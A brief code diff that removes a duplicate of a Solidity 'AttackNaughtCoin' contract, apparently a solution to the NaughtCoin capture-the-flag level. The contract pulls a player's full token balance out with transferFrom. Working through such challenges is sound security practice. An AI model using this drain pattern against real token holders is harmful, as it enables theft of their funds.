@@ -15,10 +15,3 @@ contract AttackNaughtCoin {
         IERC20(token).transferFrom(player, address(this), amount);
     }
 }
-
-contract AttackNaughtCoin {
-    function attack(address token, address player) public {
-        uint256 amount = IERC20(token).balanceOf(player);
-        IERC20(token).transferFrom(player, address(this), amount);
-    }
-}
